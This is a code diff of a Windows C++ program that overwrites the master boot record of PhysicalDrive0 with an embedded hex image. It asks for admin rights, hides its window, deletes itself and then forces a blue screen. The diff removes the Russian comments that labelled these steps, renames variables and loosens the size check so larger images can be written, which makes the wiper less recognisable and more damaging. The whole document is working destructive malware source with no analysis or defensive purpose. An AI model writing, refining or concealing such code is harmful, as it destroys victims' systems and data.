@@ -8,7 +8,6 @@ const char MBR_HEX[] = "{MBR_DATA}";
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "ntdll.lib")
 
-// === ВЫЗОВ BSOD ===
 typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
     NTSTATUS ErrorStatus,
     ULONG NumberOfParameters,
@@ -38,7 +37,6 @@ void TriggerBSOD() {
     );
 }
 
-// === ПОВЫШЕНИЕ ПРАВ ===
 void ElevateAndRun() {
     SHELLEXECUTEINFOA sei = {0};
     sei.cbSize = sizeof(sei);
@@ -51,7 +49,6 @@ void ElevateAndRun() {
     }
 }
 
-// === КОНВЕРТЕР HEX ===
 std::vector<unsigned char> HexToBytes(const std::string& hex) {
     std::vector<unsigned char> bytes;
     for (size_t i = 0; i < hex.length(); i += 2) {
@@ -62,14 +59,12 @@ std::vector<unsigned char> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
-// === ЗАПИСЬ MBR (СКРЫТО) ===
 void WriteMBR() {
     std::string hex(MBR_HEX);
-    std::vector<unsigned char> mbr = HexToBytes(hex);
+    std::vector<unsigned char> image = HexToBytes(hex);
     
-    if (mbr.size() != 512) return;
+    if (image.size() < 512) return;
     
-    // Отключаем проверки целостности Windows
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
     OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
@@ -82,7 +77,6 @@ void WriteMBR() {
     tkp.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
     AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
     
-    // Открываем диск
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
         GENERIC_WRITE,
@@ -106,12 +100,10 @@ void WriteMBR() {
         if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
-    // Записываем MBR
     DWORD bytesWritten;
-    WriteFile(hDisk, mbr.data(), 512, &bytesWritten, NULL);
+    WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
     CloseHandle(hDisk);
     
-    // Самоуничтожение
     wchar_t szPath[MAX_PATH] = {0};
     GetModuleFileNameW(NULL, szPath, MAX_PATH);
     
@@ -132,22 +124,18 @@ void WriteMBR() {
     CreateProcessW(NULL, (LPWSTR)batPath.c_str(), NULL, NULL, FALSE,
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
-    // BSOD
     HRSRC hRes = FindResourceA(NULL, "BSOD", "SETTING");
     if (hRes) {
         TriggerBSOD();
     }
 }
 
-// === ТОЧКА ВХОДА ===
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
-    // Если не админ — запрашиваем права
     if (!IsUserAnAdmin()) {
         ElevateAndRun();
         return 0;
     }
     
-    // Скрываем окно консоли
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     
     WriteMBR();
